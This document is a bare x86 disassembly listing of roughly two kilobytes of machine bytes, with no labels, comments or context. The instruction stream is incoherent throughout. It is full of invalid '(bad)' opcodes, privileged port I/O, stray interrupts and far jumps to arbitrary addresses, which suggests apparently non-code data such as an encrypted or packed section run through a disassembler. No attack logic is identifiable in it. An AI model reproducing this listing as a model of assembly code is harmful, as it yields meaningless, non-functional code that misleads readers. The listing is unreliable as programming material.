  414af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414af1:	loope  0x414ab9
  414af3:	jecxz  0x414b73
  414af5:	cmp    eax,0x47afa451
  414afa:	sub    DWORD PTR [ebp-0x78335611],edx
  414b00:	xor    eax,0x66c4d978
  414b05:	ss jnp 0x414a8b
  414b08:	jmp    0x19f9bfdb
  414b0d:	ds out dx,eax
  414b0f:	(bad)  
  414b10:	xor    ah,BYTE PTR [edi]
  414b12:	sub    ebp,DWORD PTR [edi+0x1f2c3d2c]
  414b18:	shl    BYTE PTR ds:0x1b5fb7d8,cl
  414b1e:	xor    al,0x80
  414b20:	and    eax,DWORD PTR [ecx+0x48fe675c]
  414b26:	and    DWORD PTR [ecx+ebp*2+0x45],eax
  414b2a:	mov    DWORD PTR [edi],ebx
  414b2c:	mov    ds:0xa3ceb64,al
  414b31:	jmp    0x7aaa:0xccbd50f0
  414b38:	leave  
  414b39:	ficomp DWORD PTR [ecx+0x43]
  414b3c:	adc    BYTE PTR [esi+edi*2],0x5c
  414b40:	fs ret 0x6422
  414b44:	stos   DWORD PTR es:[edi],eax
  414b45:	cli    
  414b46:	cmp    BYTE PTR [ebx-0x671398e2],dl
  414b4c:	push   edi
  414b4d:	outs   dx,BYTE PTR ds:[esi]
  414b4e:	pop    ebp
  414b4f:	cdq    
  414b50:	sbb    DWORD PTR [edx+edi*8],ebx
  414b53:	pop    eax
  414b54:	iret   
  414b55:	pop    ebx
  414b56:	icebp  
  414b57:	xchg   edi,eax
  414b58:	rcr    DWORD PTR [esi+0x359f993b],1
  414b5e:	xchg   DWORD PTR [ebx],eax
  414b60:	mov    DWORD PTR [edi*2+0x17075f9a],edx
  414b67:	mov    ds:0x96e59858,al
  414b6c:	sbb    edi,DWORD PTR [ebx-0x6a861bab]
  414b72:	push   ebp
  414b73:	mov    ch,0xb8
  414b75:	xor    edx,eax
  414b77:	pop    ds
  414b78:	cmp    esi,DWORD PTR [ecx-0x56]
  414b7b:	out    0x79,eax
  414b7d:	push   ebx
  414b7e:	pop    ss
  414b7f:	fs stc 
  414b81:	enter  0x61cf,0x5b
  414b85:	and    bh,ah
  414b87:	mov    ch,0x8f
  414b89:	pop    esi
  414b8a:	dec    ebp
  414b8b:	xchg   ebp,ecx
  414b8d:	lds    edx,FWORD PTR [esi]
  414b8f:	mov    ch,0x3e
  414b91:	push   esp
  414b92:	pop    esi
  414b93:	int3   
  414b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b95:	bound  esi,QWORD PTR [esi]
  414b97:	jbe    0x414b8f
  414b99:	pop    esp
  414b9a:	fs push esi
  414b9c:	(bad)  
  414b9d:	clc    
  414b9e:	xchg   DWORD PTR [ebx-0x41cecd58],ebx
  414ba4:	xchg   DWORD PTR ds:0x1d6ec492,eax
  414baa:	jns    0x414bcc
  414bac:	xor    al,0xc8
  414baf:	mov    DWORD PTR [ecx+eiz*1-0x68],ebx
  414bb3:	inc    ebp
  414bb4:	inc    edi
  414bb5:	int    0xd3
  414bb7:	lds    eax,FWORD PTR [esi-0x13]
  414bba:	push   esi
  414bbb:	push   ebp
  414bbc:	inc    eax
  414bbd:	sti    
  414bbe:	push   0x54
  414bc0:	enter  0x2406,0x35
  414bc4:	xor    BYTE PTR [ecx+0x54],dh
  414bc7:	mov    cl,0x89
  414bc9:	adc    DWORD PTR [esi],esp
  414bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bcc:	jb     0x414c33
  414bce:	pop    esi
  414bcf:	dec    eax
  414bd0:	sub    BYTE PTR [edx],bl
  414bd2:	jg     0x414bff
  414bd4:	push   ebp
  414bd5:	jb     0x414c07
  414bd7:	mov    bh,0x11
  414bd9:	push   esp
  414bda:	cmc    
  414bdb:	adc    DWORD PTR [esi-0x150d049f],edx
  414be1:	mov    BYTE PTR [eax],cl
  414be3:	jbe    0x414c27
  414be5:	outs   dx,BYTE PTR ds:[esi]
  414be6:	xchg   ecx,eax
  414be7:	rcl    BYTE PTR [esi],0x95
  414bea:	clc    
  414beb:	adc    ebx,edx
  414bed:	int    0xb3
  414bef:	cmc    
  414bf0:	arpl   WORD PTR [ecx+0x2b],ax
  414bf3:	push   esp
  414bf4:	hlt    
  414bf5:	(bad)  
  414bf6:	int    0xe2
  414bf8:	xchg   edx,eax
  414bf9:	cmp    DWORD PTR [edi+0x7337bc8b],ebp
  414bff:	push   ebp
  414c00:	cmp    esp,edx
  414c02:	add    DWORD PTR [edi],ebp
  414c04:	xor    ah,cl
  414c06:	dec    edi
  414c07:	mov    edx,0x628b8b72
  414c0c:	mov    es,WORD PTR [edx-0x7d]
  414c0f:	or     eax,0x35c68564
  414c14:	dec    edi
  414c15:	ret    0xc0ca
  414c18:	fwait
  414c19:	xlat   BYTE PTR ds:[ebx]
  414c1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c1b:	les    ebp,FWORD PTR [esi-0x3b]
  414c1e:	arpl   WORD PTR [esi-0x43ad0160],dx
  414c24:	int    0x81
  414c26:	js     0x414bbd
  414c28:	inc    eax
  414c29:	pop    esi
  414c2a:	div    DWORD PTR ds:0xfcc8c8db
  414c30:	scas   eax,DWORD PTR es:[edi]
  414c31:	cmc    
  414c32:	repz jb 0x414c80
  414c35:	mov    ebx,0x23cb59b7
  414c3a:	gs push ebp
  414c3c:	dec    esi
  414c3d:	icebp  
  414c3e:	pop    ebx
  414c3f:	je     0x414bea
  414c41:	imul   ebp,DWORD PTR [ecx],0x9875c292
  414c47:	push   ebx
  414c48:	inc    edi
  414c49:	(bad)  
  414c4a:	jge    0x414bf7
  414c4c:	loopne 0x414c8d
  414c4e:	fs push 0x78cd119f
  414c54:	xlat   BYTE PTR ds:[ebx]
  414c55:	sbb    bl,BYTE PTR [edx+0x3ef1e688]
  414c5b:	xor    ebx,DWORD PTR [eax-0x7803250f]
  414c61:	test   BYTE PTR [ebx-0x740617f1],ch
  414c67:	ss pop edx
  414c69:	push   ss
  414c6a:	pop    edi
  414c6b:	xchg   ecx,eax
  414c6c:	in     al,0xd5
  414c6e:	add    ah,0x5b
  414c71:	push   ecx
  414c72:	idiv   DWORD PTR [ecx-0x4d]
  414c75:	add    BYTE PTR [ecx-0x2d],0x9f
  414c79:	or     BYTE PTR [ebp+0x4579a349],dh
  414c7f:	fistp  DWORD PTR [ebx]
  414c81:	add    DWORD PTR [edx-0x6a],ebp
  414c84:	pop    esi
  414c85:	je     0x414c4f
  414c87:	xchg   esi,eax
  414c88:	jmp    0x1a304dbd
  414c8d:	call   0xc4e9e368
  414c92:	inc    edi
  414c93:	pop    eax
  414c94:	and    dl,bl
  414c96:	mov    es,esi
  414c98:	test   eax,0xef0e9b52
  414c9d:	sbb    eax,0xe12315a6
  414ca2:	and    eax,0xca55d020
  414ca7:	jp     0x414cd9
  414ca9:	and    BYTE PTR [ecx*8+0x54b2bff0],0x61
  414cb1:	mov    ch,0xda
  414cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cb4:	inc    ebx
  414cb5:	fbld   TBYTE PTR [esi-0x7d]
  414cb8:	clc    
  414cb9:	out    0xff,al
  414cbb:	shr    BYTE PTR cs:[ebp+0xb87b597],0xeb
  414cc3:	push   eax
  414cc4:	fwait
  414cc5:	adc    DWORD PTR [eax],esi
  414cc7:	mov    ah,0xb
  414cc9:	inc    esi
  414cca:	pop    esi
  414ccb:	jle    0x414c89
  414ccd:	push   esp
  414cce:	ror    BYTE PTR [ecx+edi*2+0x71],cl
  414cd2:	pop    esi
  414cd3:	jnp    0x414c82
  414cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cd6:	(bad)  
  414cd7:	xchg   ebp,eax
  414cd8:	push   0xca2fc8e8
  414cdd:	push   ebp
  414cde:	clc    
  414cdf:	(bad)  
  414ce0:	mov    bh,0x6
  414ce2:	loopne 0x414c78
  414ce4:	loope  0x414c87
  414ce6:	inc    BYTE PTR [ebp-0x3c]
  414ce9:	and    al,0x36
  414ceb:	or     BYTE PTR [edi+0x4c],0xa8
  414cef:	jge    0x414d6f
  414cf1:	ss jae 0x414cbb
  414cf4:	mov    eax,ds:0x979c2a52
  414cf9:	arpl   WORD PTR [edi+0x1a],sp
  414cfc:	out    0x79,al
  414cfe:	pop    ds
  414cff:	adc    BYTE PTR [edi+0x599187e6],0x2c
  414d06:	int3   
  414d07:	pop    ebp
  414d08:	and    eax,0x12420bb7
  414d0d:	scas   al,BYTE PTR es:[edi]
  414d0e:	fmul   DWORD PTR [ebx+0xb]
  414d11:	ds iret 
  414d13:	test   al,0x5e
  414d15:	repnz (bad) 
  414d17:	out    dx,al
  414d18:	sub    esi,DWORD PTR [ebp+edi*4-0x5e98573e]
  414d1f:	std    
  414d20:	adc    DWORD PTR [eax-0x24],ecx
  414d23:	js     0x414da3
  414d25:	cmp    eax,0x273c2e08
  414d2a:	daa    
  414d2b:	and    eax,0xfe7be411
  414d30:	aaa    
  414d31:	push   esi
  414d32:	add    esi,DWORD PTR ds:0x589112c6
  414d38:	test   al,0x4
  414d3a:	mov    edi,0x7a7463a3
  414d3f:	mov    eax,ds:0xd007276f
  414d44:	out    dx,eax
  414d45:	dec    edi
  414d46:	mov    bh,0x1c
  414d48:	out    dx,al
  414d49:	test   bl,cl
  414d4b:	repnz mul eax
  414d4e:	test   al,0x90
  414d50:	mov    ecx,0x164b220
  414d55:	mov    dh,0xfb
  414d57:	xchg   ebx,eax
  414d58:	sub    ah,BYTE PTR [edi-0x18]
  414d5b:	inc    ebx
  414d5c:	mov    al,ds:0x1e9fd361
  414d61:	mov    eax,ds:0x351e31d9
  414d66:	or     BYTE PTR [ebx+ecx*8],bl
  414d69:	out    0xba,al
  414d6b:	inc    esp
  414d6c:	mov    ds:0x7a14e7f9,al
  414d71:	je     0x414d79
  414d73:	les    ebp,FWORD PTR [ebx]
  414d75:	inc    ebp
  414d76:	pop    esi
  414d77:	sar    DWORD PTR [ebx+eiz*4],0xc4
  414d7b:	pop    es
  414d7c:	pop    es
  414d7d:	dec    esi
  414d7e:	or     ecx,eax
  414d80:	(bad)  
  414d81:	adc    BYTE PTR [eax],dl
  414d83:	lds    ecx,FWORD PTR [edx-0x70]
  414d86:	imul   esi,DWORD PTR [eax],0x4d75d631
  414d8c:	mov    ebp,0x5791d02f
  414d91:	(bad)  
  414d92:	in     al,dx
  414d93:	lds    ebx,FWORD PTR [edi+0x10]
  414d96:	icebp  
  414d97:	adc    DWORD PTR [ebx+0x4ac450c2],ebp
  414d9d:	jg     0x414dca
  414d9f:	mov    eax,ds:0x8c0e924b
  414da4:	xlat   BYTE PTR ds:[ebx]
  414da5:	pop    ebp
  414da7:	aas    
  414da8:	bound  eax,QWORD PTR [edi-0xd500948]
  414dae:	test   al,0xd3
  414db0:	in     eax,0x0
  414db2:	mov    ds:0x93d2933e,eax
  414db7:	cli    
  414db8:	mov    esi,0x5699dd51
  414dbd:	mov    ch,0x6a
  414dbf:	sahf   
  414dc0:	xlat   BYTE PTR ds:[ebx]
  414dc1:	dec    esi
  414dc2:	xchg   ecx,eax
  414dc3:	sbb    DWORD PTR [ecx-0x31],esp
  414dc6:	mov    edi,0xbbf27a19
  414dcb:	lahf   
  414dcc:	stos   DWORD PTR es:[edi],eax
  414dcd:	jmp    0x414d7c
  414dcf:	xor    ah,dh
  414dd1:	cwde   
  414dd2:	dec    esi
  414dd3:	pop    ds
  414dd4:	adc    al,0x83
  414dd6:	jle    0x414da5
  414dd8:	mov    ch,0x83
  414dda:	push   edi
  414ddb:	or     BYTE PTR [ebx+0x1438e63a],al
  414de1:	ins    DWORD PTR es:[edi],dx
  414de2:	xor    al,0xf5
  414de4:	mov    dh,0xa3
  414de6:	mov    eax,0xe4339b07
  414deb:	xchg   ebx,eax
  414dec:	cmp    eax,0xd210c03d
  414df1:	out    dx,al
  414df2:	pop    ebx
  414df3:	xor    esp,0xfffffff9
  414df6:	dec    edi
  414df7:	loope  0x414d9e
  414df9:	inc    eax
  414dfa:	retf   
  414dfb:	(bad)  [eax]
  414dfd:	addr16 push edx
  414dff:	lock ins BYTE PTR es:[edi],dx
  414e01:	aam    0x28
  414e03:	in     al,0x99
  414e05:	mov    BYTE PTR [esi-0x3283c8b6],bl
  414e0b:	fimul  WORD PTR [ebx]
  414e0d:	stos   BYTE PTR es:[edi],al
  414e0e:	sub    ch,bh
  414e10:	test   DWORD PTR [ebx+0x5fb8e4d8],edx
  414e16:	arpl   dx,dx
  414e18:	es or  eax,0xb563928
  414e1e:	mov    al,ds:0x25db3c62
  414e23:	pop    esp
  414e24:	mov    edx,DWORD PTR [edi]
  414e26:	shl    DWORD PTR ds:0xd18de01c,0x41
  414e2d:	cwde   
  414e2e:	mov    dh,0xb9
  414e30:	mov    dl,0x2d
  414e32:	push   edi
  414e33:	lock cdq 
  414e35:	frstor [ebp+0x21e39be]
  414e3b:	xchg   ebp,eax
  414e3c:	jp     0x414e98
  414e3e:	cwde   
  414e3f:	inc    esi
  414e40:	jmp    0x7b37:0x98b3e35e
  414e47:	mov    eax,ds:0xa9e0dd34
  414e4c:	loop   0x414e59
  414e4e:	dec    di
  414e50:	sub    ebp,0xba7f375b
  414e56:	dec    edx
  414e57:	out    0x7c,eax
  414e59:	mov    ebx,es
  414e5b:	push   eax
  414e5c:	dec    ebp
  414e5d:	fild   QWORD PTR [esi-0x20]
  414e60:	jns    0x414e4d
  414e62:	sti    
  414e63:	rcl    BYTE PTR [eax+ebx*4-0x15],1
  414e67:	pop    edi
  414e68:	lock lock or al,bh
  414e6c:	inc    eax
  414e6d:	or     DWORD PTR [edi-0x4d],ecx
  414e70:	fld    QWORD PTR [ecx+ebx*4+0x461ffb83]
  414e77:	inc    eax
  414e78:	jb     0x414ec7
  414e7a:	mov    al,ds:0xb848842a
  414e7f:	jle    0x414e31
  414e81:	cdq    
  414e82:	pop    ebx
  414e83:	adc    BYTE PTR [ecx],0x9f
  414e86:	and    DWORD PTR [ebp-0x4ad4310],ecx
  414e8c:	fadd   DWORD PTR ds:0x1f0830ba
  414e92:	mov    ds:0xac2b496b,al
  414e97:	ffreep st(5)
  414e99:	std    
  414e9a:	cmp    al,0x2a
  414e9c:	in     eax,0xd1
  414e9e:	mov    WORD PTR [edi],gs
  414ea0:	push   es
  414ea1:	das    
  414ea2:	pop    edi
  414ea3:	(bad)  
  414ea5:	xchg   edx,eax
  414ea6:	mov    dl,0x3
  414ea8:	leave  
  414ea9:	mov    eax,0x8019facb
  414eae:	fcmove st,st(1)
  414eb0:	push   ecx
  414eb1:	jmp    0x2c9de01f
  414eb6:	call   0xa495:0x136642b0
  414ebd:	cmp    edi,esi
  414ebf:	clc    
  414ec0:	in     eax,0x32
  414ec2:	mov    edx,0xf0df8bf4
  414ec7:	sub    ebx,DWORD PTR [edi-0x28]
  414eca:	lock inc ebp
  414ecc:	sub    ebp,ecx
  414ece:	cmc    
  414ecf:	test   al,0x1d
  414ed1:	int    0xb7
  414ed3:	cmp    DWORD PTR [eax-0x55],esi
  414ed6:	stc    
  414ed7:	(bad)  
  414ed9:	xor    bl,BYTE PTR [ebx]
  414edb:	mov    esp,0x6d973734
  414ee0:	mov    eax,0x8f631016
  414ee5:	mov    eax,0xdf5dd853
  414eea:	add    al,0x51
  414eec:	fstp   TBYTE PTR fs:[ecx]
  414eef:	sbb    DWORD PTR [edx+ecx*2+0x4cd5f64c],esi
  414ef6:	shr    dl,0xd6
  414ef9:	adc    al,0x84
  414efb:	sub    eax,0x26fa7789
  414f00:	push   cs
  414f01:	mov    es,eax
  414f03:	test   ebx,ecx
  414f05:	loop   0x414ea1
  414f07:	(bad)  [ecx-0x57]
  414f0a:	xor    al,0xbb
  414f0c:	mov    esi,esi
  414f0e:	sbb    dh,BYTE PTR ds:[eax+0x21b368a1]
  414f15:	lock adc eax,0x4c87f356
  414f1b:	jae    0x414f6b
  414f1d:	pusha  
  414f1e:	pop    ebp
  414f1f:	cwde   
  414f20:	call   0x19ce48b
  414f25:	jp     0x414f1c
  414f27:	repnz inc ebx
  414f29:	push   esi
  414f2a:	aas    
  414f2b:	(bad)  ds:0x1c8c2e93
  414f31:	popf   
  414f32:	mov    ah,0x3f
  414f34:	sbb    DWORD PTR [ecx+0x5e603b55],eax
  414f3a:	mov    bh,0x7
  414f3c:	test   eax,0xfa5471eb
  414f41:	push   ebp
  414f42:	ret    
  414f43:	jmp    0xb1c55970
  414f48:	int    0x1
  414f4a:	fs stos BYTE PTR es:[edi],al
  414f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f4d:	pop    ebp
  414f4e:	cmovge eax,DWORD PTR [esi+0x2d43c56]
  414f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f56:	fxch   st(2)
  414f58:	(bad)  
  414f59:	rcr    BYTE PTR [edi],cl
  414f5b:	push   0xffffff87
  414f5d:	int3   
  414f5e:	mov    ecx,edx
  414f60:	mov    esp,0x849c9f09
  414f65:	imul   esi,DWORD PTR [ebp-0x26],0x7dcabaea
  414f6c:	adc    al,0x4a
  414f6e:	ins    BYTE PTR es:[edi],dx
  414f6f:	cmp    bl,0xa6
  414f72:	and    eax,0x8387db08
  414f77:	stos   DWORD PTR es:[edi],eax
  414f78:	syscall 
  414f7a:	xor    eax,edx
  414f7c:	mov    WORD PTR [edi-0x173295f9],fs
  414f82:	adc    DWORD PTR [esp+ebp*1],eax
  414f85:	jp     0x414f5d
  414f87:	push   esi
  414f88:	es test al,0xc6
  414f8b:	add    BYTE PTR [ecx+ebp*2],0xe0
  414f8f:	jb     0x414f55
  414f91:	inc    eax
  414f92:	je     0x414fd1
  414f94:	and    al,0xfe
  414f96:	in     al,dx
  414f97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f98:	(bad)  
  414f99:	xor    ecx,ebx
  414f9b:	in     eax,dx
  414f9c:	mov    DWORD PTR [edx],ebp
  414f9e:	inc    ecx
  414f9f:	shl    BYTE PTR [esi+0x3e],1
  414fa2:	shl    DWORD PTR [edx+esi*4+0x31],0x1e
  414fa7:	and    eax,0x3b30c131
  414fac:	add    al,0x17
  414fae:	out    dx,al
  414faf:	hlt    
  414fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fb1:	lods   al,BYTE PTR ds:[esi]
  414fb2:	test   al,0xb7
  414fb4:	mov    cl,0xdc
  414fb6:	test   eax,0xfffe81e3
  414fbb:	jp     0x414f68
  414fbd:	in     al,dx
  414fbe:	cs pop ss
  414fc0:	fbstp  TBYTE PTR [edx-0x1dae6761]
  414fc6:	loope  0x414fdd
  414fc8:	pop    ss
  414fc9:	pop    ebp
  414fca:	pop    esi
  414fcb:	stos   BYTE PTR es:[edi],al
  414fcc:	push   ecx
  414fcd:	les    ebp,FWORD PTR [eax-0x12]
  414fd0:	dec    ebx
  414fd1:	xchg   esp,eax
  414fd2:	popf   
  414fd3:	jnp    0x415042
  414fd5:	lea    ebx,[edi+0x79]
  414fd8:	das    
  414fd9:	fistp  WORD PTR [ebx-0x34124309]
  414fdf:	mov    bl,BYTE PTR [edi+0x378ffaac]
  414fe5:	push   0xae24b4da
  414fea:	jno    0x414ff3
  414fec:	mov    edi,0x81bd471
  414ff1:	lods   eax,DWORD PTR ds:[esi]
  414ff2:	iret   
  414ff3:	jmp    0x4aea664b
  414ff8:	retf   
  414ff9:	int3   
  414ffa:	pop    edi
  414ffb:	or     DWORD PTR [esi-0x70],eax
  414ffe:	mov    edi,0x69964e6c
  415003:	inc    ebx
  415004:	test   bl,dh
  415006:	adc    DWORD PTR [ebx+ebx*2],ecx
  415009:	cmp    DWORD PTR [ebp-0x18ef688],0xffffff90
  415010:	aad    0xb7
  415012:	out    0x41,al
  415014:	leave  
  415015:	test   al,0x2d
  415017:	retf   0x8b0c
  41501a:	push   ss
  41501b:	cmc    
  41501c:	sbb    dl,ch
  41501e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41501f:	ret    
  415020:	sar    ebx,0xea
  415023:	pusha  
  415024:	mov    edi,0xdfe32f55
  415029:	push   ss
  41502a:	and    al,0xd7
  41502c:	xchg   BYTE PTR [edi],bh
  41502e:	gs push ebx
  415030:	imul   ecx,esp,0x96f46dfd
  415036:	in     al,0xd0
  415038:	mov    esp,ecx
  41503a:	ret    
  41503b:	mov    ecx,0x577b6333
  415040:	xor    al,0x74
  415042:	pop    ss
  415043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415044:	sub    DWORD PTR [ebx+0x3e],esp
  415047:	frstor ds:0x38b7b673
  41504d:	aam    0xcd
  41504f:	adc    BYTE PTR [ebp+0xf],bh
  415052:	push   edi
  415053:	xor    dh,bh
  415055:	stos   DWORD PTR es:[edi],eax
  415056:	add    al,0x4c
  415058:	popf   
  415059:	pop    edx
  41505a:	cmp    cl,cl
  41505c:	mov    fs,WORD PTR [edx]
  41505e:	xchg   esi,eax
  41505f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415060:	add    al,0x37
  415062:	(bad)  
  415063:	fiadd  WORD PTR [edi+ebx*4-0x693395b4]
  41506a:	sub    eax,0x3b64b587
  41506f:	shl    DWORD PTR [ecx-0x100952b3],0x2b
  415076:	popf   
  415077:	fimul  WORD PTR [ecx+0x55]
  41507a:	ins    DWORD PTR es:[edi],dx
  41507b:	les    edi,FWORD PTR [ecx]
  41507d:	mov    eax,0x87512242
  415082:	cmp    eax,0x9bf20523
  415087:	fcom   QWORD PTR [ebx-0x61]
  41508a:	mov    ds:0x18d72f15,eax
  41508f:	xchg   esi,eax
  415090:	mov    es,WORD PTR [ebx]
  415092:	dec    edi
  415093:	push   ecx
  415094:	jo     0x415042
  415096:	lahf   
  415097:	cdq    
  415098:	sbb    eax,0xd549a191
  41509d:	cmc    
  41509e:	mov    esi,0xe7ede610
  4150a3:	call   0xd576e82a
  4150a8:	setae  BYTE PTR [ebx-0xc]
  4150ac:	fiadd  DWORD PTR [ebx+0x6b96b1f6]
  4150b2:	push   cs
  4150b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150b4:	pop    esp
  4150b5:	push   cs
  4150b6:	fisubr WORD PTR [ecx]
  4150b8:	loope  0x4150bb
  4150ba:	or     esi,DWORD PTR [eax+0x2e]
  4150bd:	mov    eax,ds:0xc6d6027d
  4150c2:	aaa    
  4150c3:	in     al,0xa1
  4150c5:	shl    BYTE PTR [edi],cl
  4150c7:	cmc    
  4150c8:	test   DWORD PTR [eax-0x3],ebp
  4150cb:	xor    DWORD PTR [esi-0x7e],esp
  4150ce:	xor    eax,0x2756919d
  4150d3:	cwde   
  4150d4:	fisubr WORD PTR [ebx]
  4150d6:	sub    eax,0xfad35d57
  4150db:	cld    
  4150dc:	and    WORD PTR [edx+0x2e],bp
  4150e0:	sub    BYTE PTR [edx-0x2aa36d69],bh
  4150e6:	scas   eax,DWORD PTR es:[edi]
  4150e7:	rcr    DWORD PTR [ebx],cl
  4150e9:	js     0x415151
  4150eb:	mov    ebx,0x593d8722
  4150f0:	int3   
  4150f1:	xchg   bl,dh
  4150f3:	push   ecx
  4150f4:	out    dx,eax
  4150f5:	pusha  
  4150f6:	add    esp,DWORD PTR [ebp+0x5a]
  4150f9:	pop    ds
  4150fa:	pop    ds
  4150fb:	and    eax,0xf2a7332b
  415100:	cmp    al,0x4e
  415102:	mov    cl,0xa6
  415104:	pop    ss
  415105:	js     0x4150a7
  415107:	pop    ebx
  415108:	test   eax,0x1e6f1bb1
  41510d:	lock repnz pop edx
  415110:	push   eax
  415111:	inc    esp
  415112:	test   al,0xb5
  415114:	or     bh,BYTE PTR [edx]
  415116:	fmul   st(1),st
  415118:	xchg   esp,eax
  415119:	cwde   
  41511a:	gs sbb eax,0x0
  415120:	add    BYTE PTR [eax],al
  415122:	push   ebx
  415123:	inc    edx
  415124:	or     DWORD PTR [ecx+ebx*1-0x2a100801],edi
  41512b:	pop    eax
  41512c:	cdq    
  41512d:	shr    ebx,0xfd
  415130:	rol    BYTE PTR [edx],1
  415132:	mov    eax,ds:0x22000153
  415137:	pop    es
  415138:	add    BYTE PTR [eax],al
  41513a:	and    DWORD PTR [ebx],eax
  41513c:	js     0x415148
  41513e:	jge    0x4150c5
  415140:	bswap  edx
  415142:	sbb    BYTE PTR [edx-0x63],0xb1
  415146:	push   ecx
  415147:	or     BYTE PTR ds:[ecx-0x261d84e0],cl
  41514e:	xchg   ecx,eax
  41514f:	xor    BYTE PTR [esi+esi*1+0x5c],al
  415153:	sbb    edi,esi
  415155:	mul    BYTE PTR [esi-0x29]
  415158:	sub    ah,0x61
  41515b:	mov    ebp,0xffe925d
  415160:	and    cl,dh
  415162:	ja     0x415153
  415164:	push   cs
  415165:	dec    ebp
  415166:	js     0x41518d
  415168:	pop    ds
  415169:	adc    DWORD PTR [esi-0x6d],eax
  41516c:	jle    0x4151b2
  41516e:	jecxz  0x415147
  415170:	ss icebp 
  415172:	sahf   
  415173:	xor    ah,BYTE PTR [edi-0x2a]
  415176:	nop
  415177:	scas   eax,DWORD PTR es:[edi]
  415178:	or     BYTE PTR ds:0x2c9d6456,bl
  41517e:	xor    al,0xce
  415180:	sti    
  415181:	leave  
  415182:	test   al,0xf7
  415184:	leave  
  415185:	(bad)  
  415186:	pop    esi
  415187:	and    al,0x3b
  415189:	jo     0x415170
  41518b:	imul   edx,DWORD PTR [ecx-0x740d1bcf],0xa
  415192:	sbb    edx,DWORD PTR [ebx+0x46]
  415195:	icebp  
  415196:	ret    0x5e7c
  415199:	sub    al,BYTE PTR [edi]
  41519b:	sub    al,0xeb
  41519d:	jp     0x41515d
  41519f:	int3   
  4151a0:	jp     0x415130
  4151a2:	and    bl,BYTE PTR [esi]
  4151a4:	sbb    esi,esi
  4151a6:	xchg   ebp,eax
  4151a7:	mov    ch,0xad
  4151a9:	mov    ah,0x40
  4151ab:	and    edx,esi
  4151ad:	das    
  4151ae:	jmp    0x13c0:0x92ff2b32
  4151b5:	xchg   edx,eax
  4151b6:	sbb    DWORD PTR [edi+0x4c],ecx
  4151b9:	sbb    BYTE PTR [ebp-0x1f],0x1
  4151bd:	jg     0x41519d
  4151bf:	xor    ch,ch
  4151c1:	xchg   edi,eax
  4151c2:	jae    0x41523d
  4151c4:	mov    cs,WORD PTR [ebx+edx*2]
  4151c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151c8:	mov    DWORD PTR [esi+0x44f6001b],0x9ec2f9d4
  4151d2:	cmp    DWORD PTR [ecx-0x30],eax
  4151d5:	imul   eax,DWORD PTR [esp+eax*4],0x5284ca2
  4151dc:	jb     0x4151c0
  4151de:	sub    edi,ebx
  4151e0:	inc    ecx
  4151e1:	dec    ebp
  4151e2:	xchg   ecx,eax
  4151e3:	(bad)  
  4151e4:	aad    0x90
  4151e6:	hlt    
  4151e7:	cmp    al,0x36
  4151e9:	out    dx,eax
  4151ea:	loopne 0x41517f
  4151ec:	mov    edi,0xf2b44916
  4151f1:	loopne 0x415188
  4151f3:	jg     0x415232
  4151f5:	adc    ebp,DWORD PTR [edi]
  4151f7:	jbe    0x4151be
  4151f9:	push   ebx
  4151fa:	mov    dh,0x76
  4151fc:	or     al,0x28
  4151fe:	fcom   st(5)
  415200:	push   ds
  415201:	mov    ebp,esi
  415203:	in     al,dx
  415204:	in     eax,0x32
  415206:	jbe    0x41522d
  415208:	pop    esi
  415209:	fwait
  41520a:	jmp    0xbcc4:0x72b525c5
  415211:	adc    ebp,0xe69faea5
  415217:	cmp    eax,0x8d5162df
  41521c:	div    DWORD PTR [eax]
  41521e:	push   ss
  41521f:	cmp    DWORD PTR [ebp+0x1e],edx
  415222:	sbb    DWORD PTR [ebx],esp
  415224:	jb     0x4151d1
  415226:	sbb    ah,BYTE PTR [ebx-0x2a]
  415229:	lock fcomip st,st(2)
  41522c:	mov    edi,DWORD PTR [edx]
  41522e:	repz mov dl,0x90
  415231:	shr    BYTE PTR [esi+eax*1+0x3994b1ee],cl
  415238:	aad    0x6d
  41523a:	pop    edx
  41523b:	neg    DWORD PTR [ebp+0x11]
  41523e:	mov    esi,0x95c9ced9
  415243:	fisttp DWORD PTR [eax-0x12]
  415246:	into   
  415247:	std    
  415248:	xor    DWORD PTR [edi],ebp
  41524a:	sub    al,0xa9
  41524c:	(bad)  
  41524e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41524f:	jnp    0x415242
  415251:	nop
  415252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415253:	adc    esi,ebp
  415255:	adc    ecx,DWORD PTR [eax]
  415257:	xchg   ebx,eax
  415258:	in     eax,0x44
  41525a:	push   ecx
  41525b:	int3   
  41525c:	fst    QWORD PTR [esi]
  41525e:	sub    eax,0x8cace6d9
  415263:	mov    dh,0x81
  415265:	fisttp WORD PTR [edi-0xc]
  415268:	add    cl,0xb3
  41526b:	mov    esp,0xc8c82c17
  415270:	mov    ah,0x72
  415272:	jle    0x4152e6
  415274:	cdq    
  415275:	out    0x99,eax
  415277:	loope  0x41521a
  415279:	add    DWORD PTR [edx-0x201571c2],0xffffffb4
  415280:	jg     0x41524f
  415282:	fldcw  WORD PTR [ebp-0x3d66df9f]
  415288:	or     DWORD PTR [ebx-0x25],0xe368b739
  41528f:	push   esi
  415290:	cwde   
  415291:	and    BYTE PTR [ebx],bl
  415293:	jmp    0xafbeea61
  415298:	and    ah,ah
  41529a:	pop    edx
  41529b:	test   al,0x14
  41529d:	icebp  
  41529e:	je     0x41523c
  4152a0:	adc    eax,0xcfae2956
  4152a5:	mov    ds:0x4f0b5569,eax
  4152aa:	mov    DWORD PTR [ebx+eiz*2+0x42040a19],ebp
  4152b1:	push   ds
